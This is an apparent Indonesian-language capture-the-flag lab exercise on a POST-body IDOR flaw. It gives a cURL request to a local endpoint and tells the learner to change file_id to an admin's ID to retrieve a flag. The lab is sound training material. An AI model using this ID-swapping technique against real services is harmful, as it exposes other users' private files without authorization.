[S-06] POST Body IDOR

Tujuan: Dapatkan nama file rahasia milik admin (ID File: F201).

Area Lab

Gunakan tool seperti cURL untuk mengirim request POST ke /api/v2/file-metadata.

Contoh Request (cURL):

curl -X POST -H "Content-Type: application/json" \ -d '{"file_id": "F101"}' \ http://127.0.0.1:5000/api/v2/file-metadata

Ubah nilai file_id menjadi F201 untuk mendapatkan flag.
